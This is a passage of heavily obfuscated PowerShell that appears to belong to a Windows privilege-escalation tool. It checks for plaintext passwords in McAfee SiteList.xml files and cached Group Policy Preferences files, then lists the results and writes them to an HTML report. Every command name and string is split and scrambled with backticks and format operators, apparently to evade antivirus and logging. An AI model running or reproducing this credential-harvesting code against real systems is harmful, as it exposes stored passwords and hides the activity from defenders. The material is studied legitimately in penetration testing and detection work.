    ${Re`su`ltS} | &('Fo'+'rm'+'a'+'t-List')
    if(${HTMLRe`Po`RT}) {
        ${R`ES`ULTs} | &('ConvertTo'+'-HT'+'M'+'L') -Head ${H`EadEr} -Body ("{2}{9}{0}{6}{5}{3}{7}{8}{4}{1}"-f'ncr','s</H2>','<H2>','ation Pool ','d','pplic','ypted A','Pas','swor','E') | &('O'+'ut-File') -Append ${Htm`l`REPORTf`ILe}
    }

    ("`n`n[*] "+'Chec'+'ki'+'ng '+'fo'+'r '+'plai'+'n'+'text '+'pass'+'w'+'ords '+'in'+' '+'McA'+'fee '+'Sit'+'eL'+'is'+'t.xml '+'f'+'iles.'+'.'+'..')
    ${r`ESuLts} = &('Get-Sit'+'e'+'ListP'+'assw'+'or'+'d') | &('Where-O'+'bj'+'ect') {${_}}
    ${r`EsU`lTs} | &('F'+'o'+'rmat-List')
    if(${H`TMlReP`oRt}) {
        ${RE`sULTs} | &('Co'+'nv'+'ert'+'To-HTML') -Head ${HEa`DEr} -Body ((("{8}{5}{4}{2}{3}{0}{1}{7}{6}"-f 'm','l{0}s','e{0}s SiteList','.x','e','cAf','H2>','</','<H2>M'))-F[CHaR]39) | &('Out'+'-'+'File') -Append ${hTm`LrepOR`TfilE}
    }
    "`n"

    ("`n`n[*] "+'Che'+'cking'+' '+'fo'+'r '+'cach'+'ed'+' '+'G'+'roup '+'Polic'+'y '+'Prefere'+'n'+'ce'+'s '+'.x'+'ml '+'fil'+'es..'+'..')
    ${ReS`Ul`TS} = &('Get-Cached'+'G'+'PPPass'+'w'+'o'+'rd') | &('Where-'+'Objec'+'t') {${_}}
    ${r`EsUL`Ts} | &('For'+'m'+'at-Lis'+'t')
    if(${Ht`mL`RE`pOrt}) {
        ${reS`UL`Ts} | &('Con'+'vertT'+'o-HTML') -Head ${h`EaD`ER} -Body ("{1}{3}{6}{2}{5}{4}{0}"-f'>','<H2>','File','Cached G','2','s</H','PP ') | &('O'+'ut-'+'File') -Append ${htmlReP`oR`Tfi`LE}
    }
    "`n"

    if(${HTm`L`R`EpOrT}) {
        ('[*]'+' '+'Re'+'por'+'t '+'wr'+'it'+'ten '+'to'+' '+"'$HtmlReportFile' "+"`n")
    }
}



